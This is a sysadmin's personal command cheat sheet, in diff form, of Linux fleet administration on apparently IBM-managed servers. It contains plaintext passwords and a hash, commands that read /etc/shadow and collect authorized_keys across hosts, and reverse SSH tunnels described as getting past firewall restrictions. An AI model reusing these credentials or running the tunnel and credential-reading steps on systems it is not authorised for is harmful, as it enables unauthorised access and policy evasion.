+- looking for Cobbler at http://192.168.124.200:80/cobbler_api
+- reading URL: http://192.168.124.200/cblr/svc/op/ks/profile/centos-6.5-x86_64-basic
+install_tree: http://192.168.124.200/cblr/links/centos-6.5-x86_64
+downloading initrd initrd.img to /boot/initrd.img_koan
+url=http://192.168.124.200/cobbler/images/centos-6.5-x86_64/initrd.img
+- reading URL: http://192.168.124.200/cobbler/images/centos-6.5-x86_64/initrd.img
+downloading kernel vmlinuz to /boot/vmlinuz_koan
+url=http://192.168.124.200/cobbler/images/centos-6.5-x86_64/vmlinuz
+- reading URL: http://192.168.124.200/cobbler/images/centos-6.5-x86_64/vmlinuz
+- ['/sbin/grubby', '--add-kernel', '/boot/vmlinuz_koan', '--initrd', '/boot/initrd.img_koan', '--args', '"ks=http://192.168.124.200/cblr/svc/op/ks/profile/centos-6.5-x86_64-basic ksdevice=link kssendmac lang= text "', '--copy-default', '--make-default', '--title=kick1457640229']
+- ['/sbin/grubby', '--update-kernel', '/boot/vmlinuz_koan', '--remove-args=root']
+- reboot to apply changes
+[root@localhost ~]# reboot
+
+###################cobbler定制安装系统############
+# cobbler system add --name=test1 --mac=52:54:00:72:66:1a --interface=eth1 --static=1 --profile=centos-6.5-x86_64-basic --hostname=test1.example.com --netboot-enabled=true --name-servers="192.168.124.1"
+# cobbler system edit --name=test1 --interface=eth1 --ip-address=192.168.124.209
+# cobbler system report --name=test1
+  
+# cobbler system add --name=test2 --mac=52:54:00:99:ac:59 --interface=eth0 --static=1 --profile=centos-6.5-x86_64-basic --hostname=test2.example.com --netboot-enabled=true --name-servers="192.168.124.1"
+# cobbler system --name=test2 --interface=eth0 --ip-address=192.168.124.208
+# cobbler system edit --name=test2 --interface=eth0 --ip-address=192.168.124.208
+# cobbler system report --name=test2
+###########################################
+
+perl -e 'print crypt("Quake3@FB",q($1$x9cD$8)),"\n"'
+
+date -d "20160207" +%s
+grep -A1 14569 .sh_history.chensen:root
+#####################import mysql data##############################
+load data infile '/tmp/srvinfo.txt' into table SrvInformation.SrvInfo_1 fields terminated by ',' optionally enclosed by '\'' lines terminated by '\n';
+load data infile '/tmp/export/dj_srv_info.txt' into table SrvInformation.SrvInfo_1 fields terminated by ',' optionally enclosed by '\'' lines terminated by '\n';
+load data infile '/tmp/export/dj_srv_info.txt' into table SrvInformation.SrvInfo fields terminated by ',' optionally enclosed by '\'' lines terminated by '\n';
+
+#############ssh in while loop######################
+while read srv user;do ssh -t $srv "sudo ls -l /home/${user}/.ssh/authorized_keys" </dev/null;done< <(cat h1|awk '{print $1,$2}')
+##############lssecfixes############################
+sudo ./lssecfixes -s other -H -d . -p |grep -v "N/A"
+rpm -qa --qf '%{name} %{version}-%{release} %{INSTALLTIME:date} \n'
+
+###################ssh key##########################
+[sam@oc1181188062 sshkey]$ cat au*.csv|awk -F',' '{print $1,$2,$3,$4,$6}'|egrep -i '/i/|/e/' |sort -k2,2 -k1,1 > personal_id.csv
+[sam@oc1181188062 sshkey]$ cat au*.csv|awk -F',' '{print $1,$2,$3,$4,$6,$NF}'|egrep -i '/s/|/f/' |sort -k2,2 -k1,1 > functionid_id.csv
+
+find /etc/sudoers -printf "%m\n"           440
+
+echo "scale=4;5200/5208" |bc
+
+dsh -M -f djs_bau "sudo /sbin/ifconfig eth1|grep -oP 'inet addr:\S+'|grep -oP '\d+.\d+.\d+.\d+'"
+dsh -M -f djs_bau "sudo /sbin/ifconfig eth0|grep -oP 'inet addr:\S+'|grep -oP '\d+.\d+.\d+.\d+'"
+#######################create ID#######################
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/db2 -g "busrsudo"
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/ihs -g "ihsadm ihssudo busrsudo"
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/was -g "wasadm wassudo busrsudo"
+./useradd_linux -u "masunith@in.ibm.com" -r -s djs_id/was_db2 -g "db2sudo wasadm wassudo busrsudo"
+
+###########################dsmc############
+dsmc rest "/opt/IBM/WebSphere/AppServer/logs/appLogs/RequestDeliveryCapabilityMED.log" "Nov20/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext01/httplogs/access_log*.gz" "ext01/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext02/httplogs/access_log*.gz" "ext02/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext02/httplogs/error_log*.gz" "ext02/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext01/httplogs/error_log*.gz" "ext01/" -ina -pick
+dsmc rest "/usr/*" /media/target/usr -sub=yes 
+dsmc q backup "/etc/openldap/slapd.conf"
+dsmc rest -pitd=04/16/2015 -pitt=15:08:51 "/etc/openldap/slapd.conf" /home/chensen/slapd.conf
+scp -r au04qws001djsr2 chensen@cn.ibm.com@w3-transfer.boulder.ibm.com:/w3/ibmconf/CSIRT_AU/2957
+
+############awk with external variable######
+var=999
+echo |awk -v A=$var '{print A}'
+or
+awk '{print $0 A}' A=$var filename
+
+############sed with variable#########
+cat test.txt |sed "s/$a/ABC/g"
+cat test.txt |sed 's/'$a'/ABC/g'
+
+###################when there's much difference between df and du############
+lsof | grep "(deleted)"            then restart app
+
+##################pssh with tunnel#################
+pssh -h djs_uat -x '-t -t -R 1880:b23leilapp01:80' --inline-stdout "sudo /usr/bin/yum list httpd"
+
+##################cssh with tunnel#################
+add below in .csshrc
+ssh_args=-R 1880:mrepos:80
+
+#################parellel #########################
+echo -e b28leidbp0{5..8}"\n"|xargs -n1 -P4 -i{} ssh {} "uname -n"
+seq 5 8|xargs -P4 -i{} ssh b28leidbp0{} ip a
+
+#!/bin/bash
+for u in `cat djs_prod`
+do
+(
+  ssh $u "uname -n;cat /etc/*release;whoami"
+)&
+done
+wait
+
+for u in `cat ID`;do grep $u /etc/passwd;done |grep -oP '\S+@in.ibm.com'
+################extract ip addr#######################
+[sam@oc1181188062 ~]$ ip a|egrep -o "inet [^ ]*"|grep -oE "[0-9]+.[0-9]+.[0-9]+.[0-9]+"
+[sam@oc1181188062 ~]$ ip a|egrep -o "inet [^ ]*"|grep -oP "[0-9]+.[0-9]+.[0-9]+.[0-9]+"
+[sam@oc1181188062 ~]$ ifconfig wlan0|grep -oP "inet addr:\S+"|grep -oP "\d+.\d+.\d+.\d+"
+[sam@oc1181188062 ~]$ ifconfig wlan0|grep -oP "inet addr:\S+"|tr -d [a-z:\ ]
+[sam@oc1181188062 ~]$ ifconfig eth0 | sed -ne "/inet addr/p" | sed -e "s/^.*addr:\([0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}\).*$/\1/g"
+ 9.115.106.173
+[sam@oc1181188062 ~]$ a=`ifconfig eth0`;a=${a/Bcast*/};a=${a/Link*addr:/};echo $a
+eth0 9.115.106.177
+[sam@oc1181188062 ~]$ a=`ifconfig eth0`;a=${a#eth*addr:};a=${a%Bcast*};echo $a
+9.115.106.177
+
+#################script & scriptreplay##################
+script -t 2> timing.log -a output.session
+scriptreplay timing.log output.session
+
+########################################################
+repeat() { while :; do $@ && return; sleep 30; done }
+cat -T file  # can display tab as ^I
+find . -iname '*.sh' -exec ./command.sh {} \;
+ls -C1|(while read u;do mv $u $u.bk;done)
+cat djs_uat1 |(while read srv user;do echo "=====$srv=====";ssh $srv "id $user" </dev/null;done)
+csplit status /SERVER/ -n 2 -s {*} -f server -b "%02d.log"
+[sam@oc1181188062 tmp]$ cat 1|echo $[ $(tr '\n' '+') 0 ]
+[sam@oc1181188062 tmp]$ cat 1|awk 'BEGIN{a=0}{a+=$0}END{print a}'
+
+################awk print new line every 9 line####################
+dsh -M -f djs_uat -c "sudo /sbin/ip a"|awk '!(NR%9){print $0"\n";next}1'
+
+##################join###################sort the file first
+join -j 1 -a1 -e " " -o '1.1,2.2' filea  fileb 
+-a filenumber  # 1 or 2   -a1   all output for file num 1
+-j FIELD   # key   equivalent to ‘-1 FIELD -2 FIELD’
+-1 FIELD  
+-2 FIELD   #compare field in file 1 and field in file 2
+-e EMPTY   
+-o FORMAT  # output format
+-t CHAR    # use CHAR as input and output field separator
+-i         # ignore lower/upper case
+-v         # like grep -v    ignore matched data
+
+############check 100GB+ file sytem################
+for u in `cat djs_srvlist`;do echo "------$u------";ssh $u "bash -c $(printf '%q' "df -h|grep -v Size|xargs -n 6|grep '[0-9]\{3,\}G'")";done
+
+############xargs #################
+[sam@oc1181188062 tmp]$ xargs -a test.txt -n 2 -L 1 bash -c 'echo $0 " is " $1'
+a  is  man
+b  is  woman
+c  is  girl
+d  is  boy
+
+find . -name "*.mef3" -print0|xargs -0 -tI{} mv {} {}.bak
+cat BAU|xargs -n1 -P5 -i{} ssh {} uptime
+echo -e b28leidbp0{5..8}"\n"|xargs -n1 -P4 -i{} ssh {} "uname -n"
+seq 5 8|xargs -P4 -i{} ssh b28leidbp0{} ip a
+
+############vmware tool version############
+# dsh -M -f djs_srvlist -c "sudo /usr/bin/vmware-config-tools.pl --help 2>&1|grep Tools"
+
+###########RPM##############
+RPM can handle most of the permissions / ownerhsip problems
+
+rpm --setugids PACKAGE
+rpm --setperms PACKAGE
+
+######gpg #############
+gpg -c your_file.txt
+gpg -d your_file.txt.gpg > your_file.txt
+
+###########Checking for patterns tied to CPU X#########
+NOTE [psr] is the processor number where the [comm]and is running.
+
+ps -eo psr,pid,tid,class,rtprio,ni,pri,pcpu,stat,wchan:14,comm --sort=psr | sort | less
+
+############ipcalc#############
+[root@oc1181188062 ~]# ipcalc -p 10.12.218.255 255.255.252.0
+PREFIX=22
+[root@oc1181188062 ~]# ipcalc -n 10.12.218.255/22
+NETWORK=10.12.216.0
+[root@oc1181188062 ~]# ipcalc -b 10.12.218.22/24
+BROADCAST=10.12.218.255
+[root@oc1181188062 ~]# ipcalc -m 10.12.218.22/22
+NETMASK=255.255.252.0
+
+#############diff sdiff##########
+ifconfig |diff -y - 123.txt
+ifconfig |sdiff -w 132 - 123.txt
+
+############ksar###########
+# LC_TIME="POSIX" sar -f sa30 -A  | tee sar30 
+# ksar -input file:///home/sam/sar25 -outputPDF sar25.pdf
+
+####################swap#################
+top -> O -> p
+smem  -rs swap
+
+pidof memcached
+pgrep memcached
+grep --color VmSwap /proc/48440/status
+
+######################init=/bin/bash############################
+When the computer starts, it runs a program called "init", usually found at /bin/init or /sbin/init. This program is responsible for all the system startup and creating a usable environment.
+
+Specifying init=/bin/bash tells the kernel to run /bin/bash instead (which is a shell). Specifying rw tells the kernel to boot with the hard disk in read-write mode instead of read-only mode. Traditionally the kernel starts with the disk in read-only mode and a process later on checks the integrity of the disk before switching to read-write.
+
+############################DJS patch########################
+lssecfixes -pF -d . 2>/dev/null | awk '/N\/A/ { next ; } ; /^ / { print $1,"-",$4; }' | sed -e 's/ //g' | sort -du
+
+lssecfixes -pF -d . 2>/dev/null | awk '/N\/A/ { next ; } ; /^ / { print $1,"-",$4; }' | sed -e 's/ //g' | sort -du| xargs yum -C --exclude=kernel upgrade -y
+echo "kernel"|xargs yum -C install -y
+
+RUN /usr/sbin/vmware-tools-upgrader
+
+/usr/bin/vmware-config-tools.pl --default
+######vim########
+:%s/p1/p2/g
+:g/pattern/d
+:g/pattern/p
+
+##cheat####
+
+./useradd_linux -u list2 -r -s racv-l508 -g wasadmin
+ssh racv-l506 "sudo su - --command='find / -type f -name "authorized_keys*" -exec ls {} \; -exec ssh-keygen -lf {} \;'"
+ssh racv-l400 "sudo su - -c 'find / -type f -name "authorized_keys*" -exec ls {} \; -exec ssh-keygen -lf {} \;'"
+
+########查IO########
+/etc/init.d/syslog stop
+echo 1 > /proc/sys/vm/block_dump
+dmesg | awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for (x in process) print process[x],x}' |sort -nr |awk '{print $2 " " $1}' | head -n 10
+echo 0 > /proc/sys/vm/block_dump
+/etc/init.d/syslog start
+
+############racv############
+ssh -R 1880:9.190.26.244:80 racv-l402
+CH3773 
+as this is the latest available version in repository , same version will be installed on other servers as well in the rest changes
+
+#!/bin/bash
+# This sed grammar is not working on RHEL3
+sed -i '/^%usrmgt/i\\n\n# IPSOFT sudo access\nUser_Alias     IBM_AE_BAU = %automata\nHost_Alias    IBM_AE_HOSTS = ALL \nCmnd_Alias  IBM_UNIX_AE_BAU_CMDS =/usr/bin/su -, /bin/su -, /usr/bin/su - root, /bin/su - root\nIBM_AE_BAU  IBM_AE_HOSTS =  NOPASSWD:ALL, !IBM_NONE_SA,!IBM_SHELLS_ALL,IBM_UNIX_AE_BAU_CMDS,!IBM_SHELLESCAPE_ALL,!IBM_NONE_EDITOR\n\n' sudoers
+
+sed -i '/^%desktop_admin_r/r IPSOFT' sudoers   匹配行后插入文本
+
+perl -lne 'BEGIN{open(A,"IPSOFT");@f=<A>;}print;if(/^%desktop_admin_r/){print "\n\n @f \n\n"}' sudoers    匹配行后
+
+perl -lne 'BEGIN{open(A,"IPSOFT");@f=<A>;}if(/^%desktop_admin_r/){print "\n\n @f \n\n"};print' sudoers    匹配行前
+
+##########option D#############
+/etc/pam.d/password-auth:auth        required      /lib64/security/pam_listfile.so item=user sense=deny file=/etc/security/userlist onerr=succeed
+/etc/pam.d/system-auth:auth	    required	  /lib64/security/pam_listfile.so item=user sense=deny file=/etc/security/userlist onerr=succeed
+
+#######sudo * ############
+/bin/chown -R pcm\:pcm /pcm/[!".."]*,\
+	/bin/chown pcmdev\:pcmdev /pcm/[!".."]*,\
+	/bin/chown -R pcmdev\:pcmdev /pcm/[!".."]*,\
+	/bin/cat /pcm/[!".."]*,\
+	/bin/ln -s /pcm/[!".."]* *,\
+	/bin/mkdir /pcm/[!".."]*,\
+	/bin/mv /pcm/[!".."]* /pcm/[!".."]*,\
+	/bin/rm /pcm/[!".."]*,\
+	/bin/rmdir /pcm/[!".."]*,\
+	/usr/bin/tail /pcm/[!".."]*,\
+	/usr/bin/tail -f /pcm/[!".."]*
+
+############sudo ##########
+
+R5,R6,SUSE11        #include
+0750 /etc/sudoers.d
+0440 /etc/sudoers.d/sample
+
+###############smbldap#############
+pdbedit -Lv alewhite  Account Flags:        [UX          ]   X表示ID被锁
+pdbedit -z -c [] username     samba ID 解锁
+
+#########POODLE ldaps fix############
+TLSProtocolMin 768   # (3 << 8) disables SSLv2
+TLSProtocolMin 769   # ((3 << 8)+1) disables SSLv2 and SSLv3
+
+OpenLDAPのサーバ(slapd)でSSL 3.0を禁止にする方法。
+slapd.confのグローバルセクションに以下の1行を記載する。
+# SSL 3.0 (プロトコルのバージョン3.0 → 0x0300 → 10進数で768)
+# TLS 1.0 (プロトコルのバージョン3.1 → 0x0301 → 10進数で769)
+# TLS 1.1 (プロトコルのバージョン3.2 → 0x0302 → 10進数で770)
+# TLS 1.2 (プロトコルのバージョン3.3 → 0x0303 → 10進数で771)
+# OpenLDAP 2.4.36未満では「TLSProtocolMin 769」と指定する。
+# OpenLDAP 2.4.36以降では「TLSProtocolMin 3.1」と指定する。
+TLSProtocolMin 3.1
+
+#####################outputs of "ssh -V"##############
+ssh -V outputs to STDERR, not STDOUT.
+Instead of saying
+ssh -V > /tmp/ssh_version_check.txt
+say
+ssh -V >& /tmp/ssh_version_check.txt
+or
+ssh -V > /tmp/ssh_version_check.txt 2>&1
+In order to save to a variable, say:
+ssh_version=$(ssh -V 2>&1)
+
+pssh -h nci2 -t 0 -x '-t -t' --inline-stdout "sudo `which lsof` -i:443,636" >scan
+
+##############operate shell variable #######
+for u in `cat 2`;do echo ${u%%.*};done      abc.cn.ibm.com ==>  abc
+for u in `cat 2`;do echo ${u#*.};done       abc.cn.ibm.com ==> cn.ibm.com
+a=abc.cn.ibm.com;echo ${a/abc/ABC}          abc.cn.ibm.com ==> ABC.cn.ibm.com
+a=abc.cn.ibm.com;echo ${a/.cn/}             abc.cn.ibm.com ==> abc.ibm.com
+
+sed -i.20150303 '/^%usrmgt/i #\ LAN\ ID\ Team\n#include\ /etc/sudoers.d/104_MANIAMLinux_GLB_v1.2.3' /etc/sudoers
+sed -i.bk 's/^%usrmgt/#%usrmgt/' /etc/sudoers
+
+###############sudo###################
+sudo cat /etc/sudoers |grep '='|egrep -vi 'alias|default|^#'|awk '{print $1}'
+
+##########chpasswd############
+pssh -h racv20160229 -x '-t -t' --inline-stdout "echo 'ycfang:new.pa550' |sudo /usr/sbin/chpasswd"
+perl -e 'print crypt("pqhkR#8ctw",q($6$3eSjHzih)),"\n"'
+pssh -h djs_1 -x '-t -t' --inline-stdout sudo /usr/sbin/usermod -p "\$1\$SOWUrC9k\$aqc8hu0xZVUI7QveI5QrY/" xujintao  #ssh need escape, local doesn't need escape.
+
+############run EP2##############  
+EP2 4 check types:
+[chensen@cfibml08 ep2_mci]$ grep -ir violation *|awk '{print $NF}'|cut -d',' -f2|grep [^0-9]|sort -u
+checkOrphanFilesDirs
+checkPermsHomeDir
+checkProcessPerms
+checkWorldWritePerm
+
+pscp -h mcilist.txt -t 0 -p 20 -r EP2/ /home/chensen
+pssh -h srv_ep2 -x '-t -t' -t 0 -p 30 "cd EP2;sudo ./EP2_Driver_V2.1.1.sh -o /home/chensen/EP2"
+pssh -h srv_ep2 -t 0 -p 30 -x '-t -t' "sudo chown -R chensen EP2/EP2_Driver_V2.1.1.sh.files"
+pslurp -h ../2 -t 0 -p 30 -l chensen -r /home/chensen/EP2/EP2_Driver_V2.1.1.sh.files .
+
+###########docker error####################
+$ sudo docker run -i -t centos /bin/bash  
+unable to remount sys readonly: unable to mount sys as readonly max retries reached
+Need to vi /etc/sysconfig/docker
+other_args="--exec-driver=lxc --selinux-enabled"
+/etc/init.d/docker restart
+
+#############change timezone to Asia Shanghai#############
+sudo sed -i 's:Etc/UTC:Asia/Shanghai:' /etc/sysconfig/clock
+sudo rm -f /etc/localtime
+sudo ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
+
+#######transfer time from one format to another format###########
+[sam@oc1181188062 test]$ ssh chensen@vader "date +%s;date"
+1412036236
+Tue Sep 30 10:17:16 EST 2014
+[sam@oc1181188062 test]$ date -d@1412036236 +"%F %T"
+2014-09-30 08:17:16
+[sam@oc1181188062 test]$ date -d@1412036236 
+Tue Sep 30 08:17:16 CST 2014
+
+###########IBM ServeRAID tools###########
+./ipssend getconfig 1
+./ipssend getstatus 1
+
+############sed add prefix for each line in file##########
+sed -i 's/^.*$/chensen@&/' r6
+
+#############eval##############
+#!/bin/bash
+a="ls | wc -l"
+b="wc -l <(ls)"
+eval $a
+eval $b
+
+###############pssh & pscp.pssh######################
+#pscp.pssh -r -h srvlist rpms/ /root
+# And now I can sudo!
+[chensen@cfibml08 ~]$ echo "b28leidbp01 b28leidbp02 b28leidbp03"|tr ' ' ','
+b28leidbp01,b28leidbp02,b28leidbp03
+[chensen@cfibml08 ~]$ dsh -M -mb28leidbp01,b28leidbp02,b28leidbp03 -c "rpm -q openssl"
+dsh -M -f filename -c command
+dsh -M -mracv-l{306,409,511,512},racv-l{308..310},racv-l{506..509} -c "rpm -q openssl"
+
+pssh -x '-t -t' --inline-stdout -Hb28leidbp0{5..8} -Hy23lexlmc0{1..6} "uptime;uname -n"
+pssh -x '-t -t' --inline-stdout --host=b28leidbp0{5..8} --host=y23lexlmc0{1..6} "uptime;uname -n"
+pssh --inline-stdout --host=b28leidbp0{5..8} -I < 1.sh
+pssh --inline-stdout --host=b28leidbp0{5..8} -I         ####enter commands
+
+###################ssh#######################################
+run complex remote shell commands over ssh,without escaping quotes
+# ssh user@host $(<cmd.txt)   or ssh -t
+# ssh user@host "`cat cmd.txt`"
+# ssh user@host "bash -c $(printf '%q' "[[ -f test ]] && echo 'this works as well'")"
+run local script against remote machines,without copy it to server
+# ssh -T user@host < local.sh
+# ssh user@host 'bash -s arg1 arg2' < local.sh
+
+#####################################################
+ssh tunnel + squid               反向tunnel +squid代理突破防火墙限制使用yum
+ssh -R 1880:9.190.26.244:80 racv-l402             轉發yum repo地址
+ssh -R 1880:10.62.32.27:33128 10.134.236.86       轉發proxy
+本机：
+1   install squid
+2   #ssh -Nf -R 7001:localhost:3128 master  本地运行
+lab机器：
+[root@learn yum.repos.d]# grep proxy ../yum.conf
+proxy=http://127.0.0.1:7001
+
+################mysql#############
+ssh -Nf -L 3306:localhost:3306 chensen@cfibml08       正向tunnel 本地运行
+mysql -h 127.0.0.1 -P 7001 -u chensen
+
+ssh -CNfL 8443:10.20.0.2:8443 root@10.67.50.156
+ssh -CNfL 8443:10.20.0.2:8443 root@10.67.50.156
+##############firefox###########
+ssh -D 7071 chensen@cfibml10
+
+######## KVM ########
+[root@oc1181188062 ~]# virsh start Windows_XP-KVM
+[root@oc1181188062 ~]# virsh -c qemu:///system start Windows_XP-KVM
+Domain Windows_XP-KVM started
+[root@oc1181188062 ~]# ibm-virt-viewer -a -c qemu:///system Windows_XP-KVM
+[root@oc1181188062 ~]# virt-manager
+# virt-cat -d agent2 /etc/nginx/conf.d/default.conf
+# virt-cat -d agent2 /usr/share/nginx/html/db.php
+# virt-ls -d agent2 /usr/share/nginx/html/
+# virt-df -d agent2
+# virsh undefine agent3 --remove-all-storage
+
+
+######### bond ################
+cat/proc/net/bonding/bond0 
+cd /sys/class/net/bond0
+
+######### SAN ####################
+[root@pcarshn01 ~]# lspci|grep -i fibre
+18:00.0 Fibre Channel: QLogic Corp. ISP2432-based 4Gb Fibre Channel to PCI Express HBA (rev 03)
+1e:00.0 Fibre Channel: QLogic Corp. ISP2432-based 4Gb Fibre Channel to PCI Express HBA (rev 03)
+[root@pcarshn01 ~]# ls /sys/class/fc_host/
+host3  host4
+[root@pcarshn01 ~]# ls /sys/class/fc_remote_ports
+rport-3:0-0  rport-4:0-0
+[root@pcarshn01 ~]# ls /sys/class/fc_transport/
+target3:0:0  target4:0:0
+# systool -c fc_host -v
+# systool -c fc_transport -v
+# systool -c fc_remote_ports -v
+# ls -l /sys/block/*/device
+# pvs
+-------------------scan HBA-------------------------
+for i in `ls /sys/class/fc_host/`
+do
+echo "***************************************************************"
+echo "Scanning HBA on `uname -n`"
+echo "1" > /sys/class/fc_host/$i/issue_lip
+echo "- - -" > /sys/class/scsi_host/$i/scan
+echo "***************************************************************"
+done
+
+############ multipathd ###############################
+# echo "help" | multipathd -k
+# echo "show maps" | multipathd -k
+#multipathd -k"show maps"      no space after -k
+psh login "multipathd -k\"show maps\""
+
+multipath -ll
+udevadm info -q all -p /block/sda
+udevinfo -q all -p /block/sdx
+
+#############  udevadm ################################
+udevadm info -q path -n /dev/sda
+udevadm info -q all -p /devices/pci0000:00/0000:00:1f.2/host0/target0:0:0/0:0:0:0/block/sda
+udevadm info -q all -p /block/sda
+udevinfo -q all -p /block/sdx
+udevadm info -q all -n /dev/sda
+
+
+udevadm info -a -p /block/sda
+udevadm info -a -n /dev/sda
+udevadm info -a -p /sys/class/net/eth0
+
+
+################ iconv ############
+iconv -f UTF-16LE -t UTF-8 -o Cirats_records ALL\ Records\ -\ Department\ Specific.csv
+
+################# Reformat RHSA record ###############
+while read adid rhsa day;do echo -en "\t\t$adid\t $rhsa\t";date -d "$day" +"%d %b %Y";done< <(grep 'RHSA' aubsqsk02umilr2\(mci\)|awk '{print $5,$6,$3}'|sort -u|tr "[]" " ")
+
+function ciratsnum(){
+if [ $# != 3 ];then
+echo "Usage: ciratsnum MCI 6 filename"
+echo "Usage: ciratsnum NZ 5 filename"
+else
+account=$1
+ver=$2
+file=$3
+while read adid rhsa day
+do
+#ciratsnum=`grep $account /home/sam/Desktop/CH-apar/Cirats_records|awk -F"\t" '/'$adid'/{print $6}'`
+ciratsnum=`cat /home/sam/Desktop/CH-apar/Cirats_records|awk -F"\t" '/'$adid'/{if($3~/'$account'/ && $39~/'$ver'/) print $6}'`
+day2=`date -d "$day" +"%d %b %Y"`
+echo -e "$ciratsnum\t$adid\t $rhsa\t$day2"
+done< <(grep 'RHSA' $file|awk '{print $5,$6,$3}'|sort -u|tr "[]" " ")
+fi
+}
+
+###################check date############################
+[sam@oc1181188062 mysrvlist]$ cat checkdate.sh 
+#!/bin/bash
+if [ $# != 1 ];then
+echo "usage: ./checkdate.sh date"
+else
+input=$1
+fi
+day=`date -d "$input days" +%Y%m%d`
+for f in `ls apar/`
+do
+grep RHSA apar/$f|egrep -v 'NOT_IN|2012'|awk '{if($1<'$day')print a,$0}' a="${f%%.*}"   外部变量
+done
+
+
+################# analyse change suggestion #############
+while read srv day;do echo -n $srv >>tmp.suggestion;date -d "$day" +%Y%m%d >>tmp.suggestion;done< <(grep 2014 change_suggest.list|awk '{print $2,$3}'|grep -f myserver)
+day=`date -d "60 days" +%Y%m%d`;cat tmp.suggestion |awk -F: '{if($2<'$day')print $0}'
+
+##############  analyse installed date & BAU date ######################
+while read srv day;do echo -n "$srv $day">>33;a=`fc $srv|grep -i bau_date:|cut -d: -f2`;echo $a|awk -F- '{if(length($2)<2) $2="0"$2;if(length($3)<2) $3="0"$3;print " "$1$2$3 }'>>33;done< <(cat 11|awk '{print $2,$1}') 
+
+cat 33|awk '{if($2<$3)print $0" installed before BAU";else print $0}'
+
+##############################################################
+while read srv ipaddr;do echo -e "###########$srv#########";ping -c1 $ipaddr;done< <(cat list|awk '{print $1,$3}')
+
+###############SGE##############
+
+[root@pcarshn01 profile.d]# psh login ps -ef|egrep 'sge_qmaster|sge_shadowd'|grep -v grep
+pcarshn02:	sgeadmin  8427     1  0 Mar09 ?        00:00:05 /opt/sw/sge/bin/lx24-amd64/sge_shadowd
+pcarshn03:	sgeadmin 15956     1  0 Mar23 ?        00:00:02 /opt/sw/sge/bin/lx24-amd64/sge_shadowd
+pcarshn01:	sgeadmin 15547     1 41 Mar23 ?        4-16:26:00 /opt/sw/sge/bin/lx24-amd64/sge_qmaster
+
+[root@pcarshn01 profile.d]# psh compute ps -ef|grep sge_execd
+
+##############################GPFS check################################3
+# mmlscluster
+# mmlsmgr
+# mmlsconfig
+# mmlsnsd -L
+# mmlsnsd -X
+# mmlsdisk rsidev -L
+# mmlsdisk rsidev -eL
+# mmdf rsidev
+# mmlsfs rsidev
+# psh login ifconfig bond0:0
+# crm_mon -1
+
+#############################rpm & yum ####################################
+[sam@oc1181188062 ~]$ rpm -q --queryformat %-{name}-%{version}-%{release}.%{arch}"\n" openssl
+openssl-1.0.1e-16.el6_5.7.x86_64
+openssl-1.0.1e-16.el6_5.7.i686
+
+###How to download only the rpm package without install####
+yum install yum-downloadonly
+yum upgrade --downloadonly --downloaddir=/home/chensen/packages kernel kernel-headers openssl openssl-devel nc parted
+yum install --downloadonly --downloaddir=/home/chensen/packages nc parted
+yum upgrade --downloadonly --downloaddir=/home/chensen/packages kernel nss nspr samba3x-client samba3x-common samba3x-winbind
+###How to check the files contained in rpm package and extract file from rpm package#######
+rpm2cpio mysql-sererver/application
+for i in `cat igalist`;do echo -n $i;fc $i|grep 'Application:';done
+mysql SrvInformation -e "select SrvName,Application from SrvInfo"
+mysql facts -E <<< "select * from sir where SERVER_NAME= and account_name='IBMALinux'"
+mysql facts -e "select * from sir where SERVER_NAME= and account_name='IBMALinux'\G"
+
+find peoplever.rpm | cpio -t
+rpm2cpio mysql-server.rpm | cpio -ivd "file name"
+
+################time zone################
+[root@cfibml08 Asia]# ls -l /etc/localtime
+lrwxrwxrwx 1 root root 36 Oct  2  2009 /etc/localtime -> /usr/share/zoneinfo/Australia/Sydney
+
+ln -sf /usr/share/zoneinfo/Asia/Singapore /etc/localtime
+=======================================================================================
+
+=======================change password=================================================
+[chensen@cfibml08 commands]$ cat chpass
+echo chensen:`openssl passwd -1 mc336@FB` > chpass.txt;sudo /usr/sbin/chpasswd -e <chpass.txt          ### encrypted password on server
+[chensen@cfibml08 commands]$for srv in `cat mci_srvlist_valid`;do ssh -t $srv $(<chpass);done
+[chensen@cfibml08 commands]$ for srv in `cat mci_srvlist_valid`;do ssh -t $srv "sudo chage -l chensen|grep Last";done
+
+echo chensen:`openssl passwd -1 mc336@FB` |chpasswd -e                  ###encrypt
+echo "chensen:mc336@FB" |chpasswd          ###don't need encrypt
+=======================================================================================
+sudo paste /etc/shadow /etc/passwd| awk -F: '{if($5!=90) print}' |egrep -v ':!!:|:\*:' |grep -v ':!:'
+sudo pr -mJ -t /etc/shadow /etc/passwd |awk -F: '{if($5!=90) print}' |egrep -v ':!!:|:\*:' |grep -v ':!:'
+sudo cat /etc/shadow /etc/passwd|sort -t: -k1,1|sed '$!N;s/\n/\t/'|awk -F: '{if($5!=90) print}' |egrep -v ':!!:|:\*:' |grep -v ':!:'
+sudo cat /etc/shadow /etc/passwd|sort -t: -k1,1|sed '$!N;s/\n/\t/'|grep -v ':90:' |egrep -v ':!!:|:\*:' |grep -v ':!:'
+while read user day;do [ $day -le 90 ] && grep $user /etc/shadow || cat /etc/shadow /etc/passwd|grep $user;done < <(cat /etc/shadow|egrep -v '\*|\!|90'|awk -F: '{print $1,$5}')
+while read user day;do [ `expr $day + 1` -le `expr 90 + 1` ] && grep $user /etc/shadow || cat /etc/shadow /etc/passwd|grep $user;done < <(cat /etc/shadow|egrep -v '\*|\!|90'|awk -F: '{print $1,$5}')
+
+find /usr -type f |xargs ls -l |grep '^-......rwx'
+find /usr -type d |xargs ls -ld |grep '^d......rwx'
+for u in `ls *.manual`;do cat $u|tr '\t' '  '|convert label:@- ${u%%.*}.png;done  ##convert txt to jpg in batch
+
+cd /etc/cron.d;cat * |awk '{if(NF>6){print}}'|egrep -v '^#|^$'|cut -d" " -f7-|cut -d"#" -f1 |awk '{for(i=1;i<=NF;i++)if($i!~/\//){print $i}}'|grep -v '^-.*'|tr -cs "[a-z][A-Z]-" "\n"|grep -v '^ *$'|xargs which 2>/dev/null 
+
